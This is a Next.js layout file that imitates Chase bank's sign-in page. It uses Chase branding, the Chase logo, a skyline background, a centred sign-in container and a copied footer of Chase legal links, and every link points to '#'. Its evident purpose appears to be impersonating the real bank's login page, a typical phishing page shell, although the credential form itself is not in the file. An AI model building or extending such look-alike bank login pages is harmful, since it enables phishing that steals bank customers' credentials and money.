import type { Metadata } from "next";
import "./globals.css";

export const metadata: Metadata = {
  title: "Chase - Sign In",
  description: "Sign in to access your Chase account online. Manage your finances, pay bills, and more.",
  icons: {
    icon: "/favicon.png",
  },
};

/* ── Social icon SVG components (lightweight, no external dependency) ── */
const FacebookIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
);
const InstagramIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
);
const XTwitterIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
);
const YouTubeIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M23.498 6.186a3.016 3.016 0 00-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 00.502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 002.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 002.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
);
const LinkedInIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-5 h-5"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
);
const HouseIcon = () => (
  <svg viewBox="0 0 24 24" fill="currentColor" className="w-4 h-4"><path d="M12 3l10 9h-3v9h-5v-6H10v6H5v-9H2l10-9z"/></svg>
);

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="en-US">
      <body className="min-h-screen flex flex-col bg-gray-100">

        {/* ═══════ MAIN: Background Image + Content ═══════ */}
        <main className="relative flex-grow flex items-center justify-center min-h-[600px]">

          {/* ── Full-bleed background image ── */}
          <div className="absolute inset-0 z-0 overflow-hidden bg-black">
            <img
              alt="New York City skyline at night"
              className="w-full h-full object-cover object-center opacity-90"
              src="/new_york_night_6.webp"
            />
            {/* Gradient overlay for logo readability */}
            <div className="absolute top-0 left-0 w-full h-48 bg-overlay-gradient pointer-events-none" />
          </div>

          {/* ── Chase logo over gradient ── */}
          <header className="absolute top-0 left-0 w-full z-20 py-6 text-center">
            <img
              alt="Chase"
              className="mx-auto h-8"
              src="/logo_chase_wht.webp"
            />
          </header>

          {/* ── Centered content card ── */}
          <div className="relative z-10 w-full max-w-[420px] mx-4 mt-16 mb-8" data-purpose="signin-container">
            {children}
          </div>

        </main>

        {/* ═══════ FOOTER ═══════ */}
        <footer className="bg-[#f2f2f2] border-t border-gray-200 py-6" data-purpose="site-footer">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">

            {/* Social links */}
            <div className="flex justify-center space-x-6 mb-4 text-gray-500">
              <a href="#" className="hover:text-gray-800 transition-colors" aria-label="Facebook"><FacebookIcon /></a>
              <a href="#" className="hover:text-gray-800 transition-colors" aria-label="Instagram"><InstagramIcon /></a>
              <a href="#" className="hover:text-gray-800 transition-colors" aria-label="X (Twitter)"><XTwitterIcon /></a>
              <a href="#" className="hover:text-gray-800 transition-colors" aria-label="YouTube"><YouTubeIcon /></a>
              <a href="#" className="hover:text-gray-800 transition-colors" aria-label="LinkedIn"><LinkedInIcon /></a>
            </div>

            {/* Footer navigation links */}
            <nav className="flex flex-wrap justify-center text-xs text-gray-600 mb-4 gap-x-4 gap-y-2 max-w-4xl mx-auto">
              <a className="hover:underline" href="#">Contact us</a>
              <a className="hover:underline" href="#">Privacy &amp; security</a>
              <a className="hover:underline" href="#">Terms of use</a>
              <a className="hover:underline" href="#">Accessibility</a>
              <a className="hover:underline" href="#">SAFE Act: Chase Mortgage Loan Originators</a>
              <a className="hover:underline" href="#">Fair Lending</a>
              <a className="hover:underline" href="#">About Chase</a>
              <a className="hover:underline" href="#">J.P. Morgan</a>
              <a className="hover:underline" href="#">JPMorgan Chase &amp; Co.</a>
              <a className="hover:underline" href="#">Careers</a>
              <a className="hover:underline" href="#">Español</a>
              <a className="hover:underline" href="#">Chase Canada</a>
              <a className="hover:underline" href="#">Site map</a>
              <span className="text-gray-600">Member FDIC</span>
              <span className="flex items-center text-gray-600 gap-1">
                <HouseIcon /> Equal Housing Opportunity
              </span>
            </nav>

            {/* Copyright */}
            <div className="text-center text-xs text-gray-500">
              © 2026 JPMorganChase
            </div>

          </div>
        </footer>

      </body>
    </html>
  );
}
